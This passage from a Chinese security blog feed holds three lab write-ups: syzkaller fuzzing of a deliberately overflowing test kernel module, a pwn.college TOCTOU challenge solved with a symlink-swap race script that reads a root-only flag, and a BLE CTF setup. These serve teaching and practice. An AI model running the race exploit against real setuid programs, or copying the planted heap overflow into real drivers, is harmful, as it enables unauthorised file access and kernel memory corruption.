mod_init(void) { struct proc_dir_entry *test_entry; // const struct file_operations *proc_fops = &amp;a; // [5] 注释 const struct proc_ops *proc_fops = &amp;a; // [6] 添加这行 printk(DEBUG_FLAG&quot;:proc init start!\\n&quot;); test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, NULL, proc_fops); if(!test_entry) printk(DEBUG_FLAG&quot;:there is somethings wrong!\\n&quot;); printk(DEBUG_FLAG&quot;:proc init over!\\n&quot;); return 0; } ...... static ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff) { char *c = kmalloc(512, GFP_KERNEL); copy_from_user(c, proc_user, n); // 4096 -&gt; n printk(DEBUG_FLAG&quot;:into write!\\n&quot;); return 0; } ...... module_init(mod_init); Makefile修改这一行： EXTRA_CFLAGS += -fno-stack-protector -no-pie -Wno-error=unused-result -Wno-error=error 如果想要连warning都不显示，可以加上编译选项：KBUILD_CFLAGS += -w 最后再次make，成功生成test.ko： ztree@ubuntu2:~/fuzz/kernel/test$ make make -C /home/ztree/fuzz/kernel/test/6.4.0/build M=/home/ztree/fuzz/kernel/test modules make[1]: Entering directory '/home/ztree/fuzz/kernel/linux' CC [M] /home/ztree/fuzz/kernel/test/test.o /home/ztree/fuzz/kernel/test/test.c: In function ‘proc_write’: /home/ztree/fuzz/kernel/test/test.c:47:5: warning: ignoring return value of ‘copy_from_user’ declared with attribute ‘warn_unused_result’ [-Wunused-result] 47 | copy_from_user(c, proc_user, n); | ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ MODPOST /home/ztree/fuzz/kernel/test/Module.symvers LD [M] /home/ztree/fuzz/kernel/test/test.ko make[1]: Leaving directory '/home/ztree/fuzz/kernel/linux' ztree@ubuntu2:~/fuzz/kernel/test$ ls 6.4.0 Makefile Makefile.bak modules.order Module.symvers test.c test.ko test.mod test.mod.c test.mod.o test.o 接下来，把test.c 拷贝到/linux/drivers/char/下，然后vim /linux/drivers/char/Kconfig ztree@ubuntu2:~/fuzz/kernel/test$ cp test.c ../linux/drivers/char/ ztree@ubuntu2:~/fuzz/kernel/test$ vim ../linux/drivers/char/Kconfig 添加如下内容： # SPDX-License-Identifier: GPL-2.0 # # Character device configuration # menu &quot;Character devices&quot; source &quot;drivers/tty/Kconfig&quot; config TEST_MODULE #### 添加开始 tristate &quot;Heap Overflow Test&quot; default y help This file is to test a buffer overflow. #### 添加结束 config TTY_PRINTK 在char目录下的Makefile末尾添加： ztree@ubuntu2:~/fuzz/kernel/linux$ vim drivers/char/Makefile EXTRA_CFLAGS += -Wno-error=unused-result obj-$(CONFIG_TEST_MODULE) += test.o 然后重新编译内核，可以看到确实是编译了： ztree@ubuntu2:~/fuzz/kernel/test$ cd ../linux ztree@ubuntu2:~/fuzz/kernel/linux$ make -j16 ...... CC drivers/char/test.o drivers/char/test.c: In function ‘proc_write’: drivers/char/test.c:47:5: warning: ignoring return value of ‘copy_from_user’ declared with attribute ‘warn_unused_result’ [-Wunused-result] 47 | copy_from_user(c, proc_user, n); | ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ...... 使用新编译好的内核镜像启动qemu，进去看看是否ok： root@syzkaller:~# ls /proc/test /proc/test Nice！继续！ 2.9.2 添加syzkaller规则 进入gopath/github.com/google/syzkaller/sys/linux/目录，新建proc_operation.txt： include &lt;linux/fs.h&gt; open$proc(file ptr[in, string[&quot;/proc/test&quot;]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd read$proc(fd fd, buf buffer[out], count len[buf]) write$proc(fd fd, buf buffer[in], count len[buf]) close$proc(fd fd) proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH open$proc等 $号前的syscallname是系统调用名，$号后的type是指特定类型的系统调用。 proc类型的open系统调用 这个名字是由规则编写者确定的，具体行为靠的是后面的参数去确定。 file ptr[in, string[&quot;/proc/test&quot;]]等 ArgumentName ArgumentType[Limit] ArgumentName是指参数名 ArgumentType指的是参数类型，例如上述例子有string、flags等类型。 [Limit]就是具体的参数的值，不指定的时候由syzkaller自动生成，若要指定须在后文指定。 比如proc_open_flags和proc_open_mode就在后面指定了值。 因为例子是通过/proc/test这个内核接口的写操作来触发堆溢出，因此我们需要控制的参数是open函数中的file参数为/proc/test即可，其他操作参考sys.txt。 2.9.3 确认编译了syz-extract和syz-sysgen # 之前只编译了 syz-sysgen ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ ls bin linux_amd64 linux_arm64 syz-db syz-manager syz-mutate syz-prog2c syz-repro syz-runtest syz-sysgen syz-upgrade vm.log # 编译syz-extract ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ make bin/syz-extract GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=2021032 ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ ls bin linux_amd64 linux_arm64 syz-db syz-extract syz-manager syz-mutate syz-prog2c syz-repro syz-runtest syz-sysgen syz-upgrade vm.log 2.9.4 使用 syz-extract 生成 .const 文件 ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ bin/syz-extract -os linux -sourcedir &quot;/home/ztree/fuzz/kernel/linux&quot; -arch amd64 proc_operation.txt generating linux/amd64... # 生成const文件 ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ find . -name &quot;proc_operation.txt.const&quot; ./sys/linux/proc_operation.txt.const # 查看该const文件 ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ cat sys/linux/proc_operation.txt.const # Code generated by syz-sysgen. DO NOT EDIT. arches = amd64 FASYNC = amd64:8192 O_APPEND = amd64:1024 O_CLOEXEC = amd64:524288 O_CREAT = amd64:64 O_DIRECT = amd64:16384 O_DIRECTORY = amd64:65536 O_EXCL = amd64:128 O_LARGEFILE = amd64:32768 O_NOATIME = amd64:262144 O_NOCTTY = amd64:256 O_NOFOLLOW = amd64:131072 O_NONBLOCK = amd64:2048 O_PATH = amd64:2097152 O_RDONLY = amd64:0 O_RDWR = amd64:2 O_SYNC = amd64:1052672 O_TRUNC = amd64:512 O_WRONLY = amd64:1 S_IRGRP = amd64:32 S_IROTH = amd64:4 S_IRUSR = amd64:256 S_IWGRP = amd64:16 S_IWOTH = amd64:2 S_IWUSR = amd64:128 S_IXGRP = amd64:8 S_IXOTH = amd64:1 S_IXUSR = amd64:64 __NR_close = amd64:3 __NR_open = amd64:2 __NR_read = amd64:0 __NR_write = amd64:1 __O_TMPFILE = amd64:4194304 2.9.5 运行syz-gen ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ bin/syz-sysgen 2.9.6 重新编译syzkaller ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ make clean rm -rf ./bin .descriptions sys/*/gen executor/defs.h executor/syscalls.h ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ make all 2.9.7 修改test.cfg ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ vim /home/ztree/fuzz/kernel/syzkaller-workdir/test.cfg 添加enable_syscalls： { &quot;target&quot;: &quot;linux/amd64&quot;, &quot;http&quot;: &quot;127.0.0.1:56741&quot;, &quot;workdir&quot;: &quot;/home/ztree/fuzz/kernel/syzkaller-workdir&quot;, &quot;kernel_obj&quot;: &quot;/home/ztree/fuzz/kernel/linux&quot;, &quot;image&quot;: &quot;/home/ztree/fuzz/kernel/linux/image/bullseye.img&quot;, &quot;sshkey&quot;: &quot;/home/ztree/fuzz/kernel/linux/image/bullseye.id_rsa&quot;, &quot;syzkaller&quot;: &quot;/home/ztree/fuzz/kernel/gopath/github.com/google/syzkaller&quot;, &quot;procs&quot;: 8, &quot;type&quot;: &quot;qemu&quot;, &quot;enable_syscalls&quot;: [ &quot;open$proc&quot;, &quot;read$proc&quot;, &quot;write$proc&quot;, &quot;close$proc&quot; ], &quot;vm&quot;: { &quot;count&quot;: 4, &quot;kernel&quot;: &quot;/home/ztree/fuzz/kernel/linux/arch/x86/boot/bzImage&quot;, &quot;cpu&quot;: 2, &quot;mem&quot;: 2048, &quot;cmdline&quot;: &quot;net.ifnames=0&quot;, &quot;qemu_args&quot;:&quot;-enable-kvm&quot; } } 2.9.8 fuzz 驱动test ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ bin/syz-manager -config=/home/ztree/fuzz/kernel/syzkaller-workdir/test.cfg 不一会，跑出3个crash： 查看copy_overflow： Call Trace定位到proc_write。Nice！ 参考文献 https://www.freebuf.com/vuls/322630.html http://pwn4.fun/2019/10/29/Syzkaller-Fuzz-Android-Kernel/ http://www.gandalf.site/2019/02/syzkallerfuzz-android-kernel.html https://www.cnblogs.com/m00nflower/p/16474927.html https://blog.senyuuri.info/posts/2020-04-16-fuzzing-a-pixel-3a-kernel-with-syzkaller/ https://github.com/google/syzkaller/blob/master/docs/linux/troubleshooting.md https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_android-device_arm-kernel.md ","link":"https://lzxzl.github.io/post/syzkaller-shi-yong-linux/"},{"title":"pwn.college - race condictions","content":"TOCTOU level1.0 运行查看 该程序会打开一个文件，文件名是命令行中的第一个参数argv[1]。且该程序会检查文件path中不能包含flag，文件不能是一个符号链接。 hacker@race-conditions-level-1-0:/challenge$ ll total 28 drwsr-xr-x 1 root root 4096 Jun 26 16:16 ./ drwxr-xr-x 1 root root 4096 Jun 26 16:16 ../ -rwsr-xr-x 1 root root 17464 Feb 22 02:18 babyrace_level1.0* hacker@race-conditions-level-1-0:/challenge$ file babyrace_level1.0 babyrace_level1.0: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b04434348b708f24cf7dae3754835b8c9f6b428b, for GNU/Linux 3.2.0, not stripped hacker@race-conditions-level-1-0:/challenge$ ./babyrace_level1.0 ### ### Welcome to ./babyrace_level1.0! ### Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]). The file opened will be be sent to you. This challenge will verify that the file's path does not include &quot;flag&quot;. This challenge will verify that the file is not a symlink. babyrace_level1.0: &lt;stdin&gt;:47: main: Assertion `argc &gt; 1' failed. Aborted IDA反编译 下载，拖进IDA反编译。 int __cdecl main(int argc, const char **argv, const char **envp) { // 【1】文件名通过argv[1]传入程序 int v3; // eax size_t v4; // rax struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF char buf[264]; // [rsp+B0h] [rbp-110h] BYREF unsigned __int64 v8; // [rsp+1B8h] [rbp-8h] v8 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); puts(&quot;###&quot;); // 【2】打印文字 printf(&quot;### Welcome to %s!\\n&quot;, *argv); puts(&quot;###&quot;); putchar(10); puts( &quot;Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows&quot;); puts(&quot;you to open a single file, as specified by the first argument to the program (argv[1]).\\n&quot;); puts(&quot;The file opened will be be sent to you.\\n&quot;); puts(&quot;This challenge will verify that the file's path does not include \\&quot;flag\\&quot;.&quot;); puts(&quot;This challenge will verify that the file is not a symlink.&quot;); if ( argc &lt;= 1 )// 【3】 检查是否有传入参数 __assert_fail(&quot;argc &gt; 1&quot;, &quot;&lt;stdin&gt;&quot;, 0x2Fu, &quot;main&quot;); if ( strstr(argv[1], &quot;flag&quot;) ) // 【4】检查文件名中是否包含flag { puts(&quot;Error: path contains `flag`!&quot;); exit(1); } puts(&quot;Calling lstat (does not follow symlinks) on the path.\\n&quot;); // 【5】如果不包含flag，打印文字 puts(&quot;Paused (press enter to continue)&quot;); getchar(); // 【6】等待输入 if ( (unsigned int)lstat((char *)argv[1], &amp;stat_buf) == -1 ) // 【7】获取文件信息 { puts(&quot;Error: failed to get file status!&quot;); exit(1); } if ( (stat_buf.st_mode &amp; 0xF000) == 40960 ) // 【8】检查文件是否是符号链接 { puts(&quot;Error: file is a symlink!&quot;); exit(1); } puts(&quot;Sleeping for 10000us!\\n&quot;); usleep(0x2710u); // 【9】如果文件不是符号链接，睡眠10000us puts(&quot;Paused (press enter to continue)&quot;); getchar(); // 【10】等待输入 v3 = open(argv[1], 0); // 【11】打开文件 v4 = read(v3, buf, 0x100uLL); // 【12】读取文件 write(1, buf, v4); // 【13】将读取的内容写到stdout puts(&quot;### Goodbye!&quot;); return 0; } Time of Check： 【4】文件名中不包含flag 【7-8】文件不是符号链接 Time of Use： 【11-13】读取文件内容并写到stdout Check和Use中间存在一个很大的窗口，尤其是有usleep和getchar。假设一开始创建一个空文件aaa，那么很明显能通过两个check。如果在【8】-&gt;【11】的这一段时间里，将test改成/flag的symlink，那么就能读取flag！！！ Expolit # 【1】创建空文件aaa hacker@race-conditions-level-1-0:/challenge$ touch ~/aaa hacker@race-conditions-level-1-0:/challenge$ ls ~/aaa /home/hacker/aaa # 【2】执行漏洞文件 hacker@race-conditions-level-1-0:/challenge$ ./babyrace_level1.0 /home/hacker/aaa ### ### Welcome to ./babyrace_level1.0! ### Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]). The file opened will be be sent to you. This challenge will verify that the file's path does not include &quot;flag&quot;. This challenge will verify that the file is not a symlink. Calling lstat (does not follow symlinks) on the path. Paused (press enter to continue) # 【3】回车 Sleeping for 10000us! Paused (press enter to continue) # 【4】程序停在这，等待输入 pwn.college{QgBeUPjfJ7iPR9rxJFUIilbTL9P.QXxADNsgjM5QzW} ### Goodbye! 另开一个终端窗口： # 【5】修改aaa为/flag的符号链接 hacker@race-conditions-level-1-0:/challenge$ ln -fs /flag /home/hacker/aaa hacker@race-conditions-level-1-0:/challenge$ 回到第一个终端窗口： Paused (press enter to continue) # 【4】程序停在这，等待输入-&gt;【6】回车 pwn.college{QgBeUPjfJ7iPR9rxJFUIilbTL9P.QXxADNsgjM5QzW} # 【7】flag被打印出来 ### Goodbye! level1.1 运行查看 # 【1】一样，需要带参数运行 hacker@race-conditions-level-1-1:/challenge$ ./babyrace_level1.1 ### ### Welcome to ./babyrace_level1.1! ### babyrace_level1.1: &lt;stdin&gt;:40: main: Assertion `argc &gt; 1' failed. Aborted # 【2】参数不能带flag hacker@race-conditions-level-1-1:/challenge$ ./babyrace_level1.1 /flag ### ### Welcome to ./babyrace_level1.1! ### Error: path contains `flag`! # 【3】程序功能同样是读取并打印文件内容 hacker@race-conditions-level-1-1:/challenge$ ./babyrace_level1.1 /etc/profile ### ### Welcome to ./babyrace_level1.1! ### # /etc/profile: system-wide .profile file for the Bourne shell (sh(1)) # and Bourne compatible shells (bash(1), ksh(1), ash(1), ...). if [ &quot;${PS1-}&quot; ]; then if [ &quot;${BASH-}&quot; ] &amp;&amp; [ &quot;$BASH&quot; != &quot;/bin/sh&quot; ]; then # The file bash.bashrc already sets the ### Goodbye! # 【4】验证确实是读取并打印文件内容 hacker@race-conditions-level-1-1:/challenge$ cat /etc/profile # /etc/profile: system-wide .profile file for the Bourne shell (sh(1)) # and Bourne compatible shells (bash(1), ksh(1), ash(1), ...). if [ &quot;${PS1-}&quot; ]; then if [ &quot;${BASH-}&quot; ] &amp;&amp; [ &quot;$BASH&quot; != &quot;/bin/sh&quot; ]; then # The file bash.bashrc already sets the default PS1. # PS1='\\h:\\w\\$ ' if [ -f /etc/bash.bashrc ]; then . /etc/bash.bashrc fi else if [ &quot;`id -u`&quot; -eq 0 ]; then PS1='# ' else PS1='$ ' fi fi fi if [ -d /etc/profile.d ]; then for i in /etc/profile.d/*.sh; do if [ -r $i ]; then . $i fi done unset i fi IDA反编译 和level1.0差不多，不过是中间少了一些打印语句，以及getchar()。check和use中间仍然有1秒的时间窗，手动肯定是来不及了，那就用脚本来利用TOCTOU。 int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // eax size_t v4; // rax struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF char buf[264]; // [rsp+B0h] [rbp-110h] BYREF unsigned __int64 v8; // [rsp+1B8h] [rbp-8h] v8 = __readfsqword(0x28u); // 【1】文件名通过argv[1]传入程序 setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); puts(&quot;###&quot;); // 【2】打印文字 printf(&quot;### Welcome to %s!\\n&quot;, *argv); puts(&quot;###&quot;); putchar(10); if ( argc &lt;= 1 ) // 【3】 检查是否有传入参数 __assert_fail(&quot;argc &gt; 1&quot;, &quot;&lt;stdin&gt;&quot;, 0x28u, &quot;main&quot;); if ( strstr(argv[1], &quot;flag&quot;) ) // 【4】检查文件名中是否包含flag { puts(&quot;Error: path contains `flag`!&quot;); exit(1); } if ( (unsigned int)lstat((char *)argv[1], &amp;stat_buf) == -1 )// 【5】获取文件信息 { puts(&quot;Error: failed to get file status!&quot;); exit(1); } if ( (stat_buf.st_mode &amp; 0xF000) == 40960 ) // 【6】检查文件是否是符号链接 { puts(&quot;Error: file is a symlink!&quot;); exit(1); } usleep(0x2710u); // 【7】如果文件不是符号链接，睡眠10000us，即1s v3 = open(argv[1], 0); // 【8】读取文件内容并打印 v4 = read(v3, buf, 0x100uLL); write(1, buf, v4); puts(&quot;### Goodbye!&quot;); return 0; } Exploit 1、重新创建文件aaa hacker@race-conditions-level-1-1:/challenge$ rm ~/aaa hacker@race-conditions-level-1-1:/challenge$ touch ~/aaa 2、在challenge目录下执行如下python脚本，让父子进程竞争，当子进程在那1s内执行了一次时，然后父进程马上进行读操作时，就能读到flag。 先测试一下python重新创建文件的操作： # 查看测试脚本内容 hacker@race-conditions-level-1-1:~$ cat test.py import os os.unlink(&quot;/home/hacker/aaa&quot;) os.close(os.open(&quot;/home/hacker/aaa&quot;, os.O_CREAT)) # 创建文件 hacker@race-conditions-level-1-1:~$ touch aaa # 查看文件的时间 hacker@race-conditions-level-1-1:~$ ll aaa -rw-r--r-- 1 hacker hacker 0 Jul 4 15:55 aaa # 符号链接 hacker@race-conditions-level-1-1:~$ ln -fs /flag aaa hacker@race-conditions-level-1-1:~$ ll aaa lrwxrwxrwx 1 hacker hacker 5 Jul 4 15:55 aaa -&gt; /flag # 删除链接并重新创建文件 hacker@race-conditions-level-1-1:~$ python test.py # 确认 hacker@race-conditions-level-1-1:~$ ll aaa -rwxr-xr-x 1 hacker hacker 0 Jul 4 15:56 aaa* 下面是脚本的最终内容： #! /usr/bin/python3 import os from pwn import * def recreate(): os.unlink(&quot;/home/hacker/aaa&quot;) os.close(os.open(&quot;/home/hacker/aaa&quot;, os.O_CREAT)) def symlink2flag(): os.unlink(&quot;/home/hacker/aaa&quot;) os.symlink(&quot;/flag&quot;, &quot;/home/hacker/aaa&quot;) if __name__ == &quot;__main__&quot;: attempts = 0 forkPID = 0 # 子进程 # 【1】如果aaa不存在就创建 # 【2】不断地重新创建文件aaa并将其符号链接到flag if os.fork() == 0: forkPID = os.getpid() print(&quot;child: &quot;+ str(forkPID)) os.close(os.open(&quot;/home/hacker/aaa&quot;, os.O_CREAT)) while True: recreate() symlink2flag() # 父进程不断运行 /challenge/babyrace_level1.1 /home/hacker/aaa，并接收返回 # 如果返回结果中包含pwn.college，那就打印并结束 else: while True: attempts += 1 p = process([&quot;/challenge/babyrace_level1.1&quot;, &quot;/home/hacker/aaa&quot;], level=&quot;CRITICAL&quot;) result = (p.readall().decode()) if &quot;pwn.college&quot; in result: log.success(result) log.info(f&quot;Took {attempts} attempts&quot;) cmd = &quot;kill &quot; + str(forkPID) os.system(cmd) break p.close() 结果如下： hacker@race-conditions-level-1-1:/challenge$ python ~/exp1.py [+] ### ### Welcome to /challenge/babyrace_level1.1! ### pwn.college{ouPxxbqEWTMxJexCQrI6EVRpDCL.QXyADNsgjM5QzW} ### Goodbye! [*] Took 2 attempts 这个还是不更新了，公开不大好。 参考文献 https://cov-comsec.github.io/posts/2022_race_conditions/ https://cov-comsec.github.io/posts/2022_race_conditions/presentation.pdf ","link":"https://lzxzl.github.io/post/pwncollege-race-condictions-geng-xin-zhong/"},{"title":"Bluetooth - GATT - BLE_CTF","content":"环境搭建 # 1、安装esptool ztree@ubuntu2:~/bt/ble_ctf$ sudo apt install esptool # 2、clone ble_ctf仓库 ztree@ubuntu2:~/bt$ git clone https://github.com/hackgnar/ble_ctf.git Cloning into 'ble_ctf'... remote: Enumerating objects: 667, done. remote: Counting objects: 100% (46/46), done. remote: Compressing objects: 100% (39/39), done. remote: Total 667 (delta 20), reused 24 (delta 6), pack-reused 621 Receiving objects: 100% (667/667), 2.13 MiB | 3.38 MiB/s, done. Resolving deltas: 100% (348/348), done. # 3、cd进目录 ztree@ubuntu2:~/bt$ cd ble_ctf/ # 4、Flash the pre-compiled binaries ztree@ubuntu2:~/bt/ble_ctf$ esptool --chip esp32 --port /dev/ttyUSB0 \\ --baud 115200 --before default_reset --after hard_reset write_flash \\ -z --flash_mode dio --flash_freq 40m --flash_size detect \\ 0x1000 build/bootloader/bootloader.bin \\ 0x10000 build/gatt_server_service_table_demo.bin \\ 0x8000 build/partitions_singleapp.bin esptool.py v2.8 Serial port /dev/ttyUSB0 Connecting........_ Chip is ESP32D0WDQ5 (revision 3) Features: WiFi, BT, Dual Core, 240MHz, VRef calibration in efuse, Coding Scheme None Crystal is 40MHz MAC: c0:49:ef:66:26:dc Enabling default SPI flash mode... Configuring flash size... Auto-detected Flash size: 4MB Erasing flash... Flash params set to 0x0220 Compressed 24832 bytes to 15374... Took 0.21s to erase flash block Wrote 24832 bytes (15374 compressed) at 0x00001000 in 1.6 seconds (effective 124.7 kbit/s)... Hash of data verified. Erasing flash... Compressed 725920 bytes to 429975... Took 2.73s to erase flash block Wrote 725920 bytes (429975 compressed) at 0x00010000 in 43.9 seconds (effective 132.4 kbit/s)... Hash of data verified. Erasing flash... Compressed 3072 bytes to 103... Took 0.07s to erase flash block Wrote 3072 bytes (103 compressed) at 0x00008000 in 0.1 seconds (effective 199.4 kbit/s)... Hash of data verified. Leaving... Hard resetting via RTS pin... https://github.com/hackgnar/ble_ctf/blob/master/docs/setup.md 扫描周围低功耗设备：hcitool lescan会看到一个名为 BLECTF 的设备 ztree@ubuntu2:~/bt/ble_ctf$ sudo hcitool lescan LE Scan ... C0:49:EF:66:26:DE BLECTF ...... Flag 1 Description: This flag is a gift and can only be obtained from reading the hint! Hint: Flag one is a gift! You can only obtain it by reading this document or peaking at the source code. In short, this flag is to get you familiar with doing a simple write to a BLE handle. Do the following to get your first flag. Make sure you replace the MAC address in the examples below with your devices mac address! First, check out your score: gatttool -b de:ad:be:ef:be:f1 --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Next, lets sumbmit the following flag. gatttool -b de:ad:be:ef:be:f1 --char-write-req -a 0x002c -n $(echo -n &quot;12345678901234567890&quot;|xxd -ps) Finaly, check out your score again to see your flag got accepted: gatttool -b de:ad:be:ef:be:f1 --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' hmmm...执行命令后无反应，然后报错超时。。。试着配对连接了一下，才能开始做题。 ztree@ubuntu2:~/bt/ble_ctf$ bluetoothctl Agent registered [CHG] Controller A8:93:4A:6F:31:2E Pairable: yes [bluetooth]# scan on Discovery started [CHG] Controller A8:93:4A:6F:31:2E Discovering: yes [NEW] Device C0:49:EF:66:26:DE BLECTF [NEW] Device 47:17:B7:A8:07:14 47-17-B7-A8-07-14 [NEW] Device 76:9B:5D:FC:DE:FC 76-9B-5D-FC-DE-FC [CHG] Device 47:17:B7:A8:07:14 RSSI: -56 ...... [bluetooth]# pair C0:49:EF:66:26:DE Attempting to pair with C0:49:EF:66:26:DE [CHG] Device C0:49:EF:66:26:DE Connected: yes [NEW] Primary Service (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0001 00001801-0000-1000-8000-00805f9b34fb Generic Attribute Profile [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0001/char0002 00002a05-0000-1000-8000-00805f9b34fb Service Changed [NEW] Descriptor (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0001/char0002/desc0004 00002902-0000-1000-8000-00805f9b34fb Client Characteristic Configuration [NEW] Primary Service (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028 000000ff-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0029 0000ff01-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char002b 0000ff02-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char002d 0000ff03-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char002f 0000ff04-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0031 0000ff05-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0033 0000ff06-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0035 0000ff07-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0037 0000ff08-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0039 0000ff09-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char003b 0000ff0a-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char003d 0000ff0b-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char003f 0000ff0c-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0041 0000ff0d-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0043 0000ff0e-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0045 0000ff0f-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0047 0000ff10-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0049 0000ff11-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char004b 0000ff12-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char004d 0000ff13-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char004f 0000ff14-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0051 0000ff15-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0053 0000ff16-0000-1000-8000-00805f9b34fb Unknown [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_C0_49_EF_66_26_DE/service0028/char0055 0000ff17-0000-1000-8000-00805f9b34fb Unknown [CHG] Device C0:49:EF:66:26:DE ServicesResolved: no [CHG] Device C0:49:EF:66:26:DE Connected: no Failed to pair: org.bluez.Error.AuthenticationCanceled hmmm...这是连接失败？先不管了，至少能开始做题了 解题： # 1、查看分数 ztree@ubuntu2:~/bt/ble_ctf$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score: 0/20 # 2、提交flag ztree@ubuntu2:~/bt/ble_ctf$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;12345678901234567890&quot;|xxd -ps) Characteristic value was written successfully # 3、再次查看分数 ztree@ubuntu2:~/bt/ble_ctf$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:1 /20 分析一下这两个命令： -b: 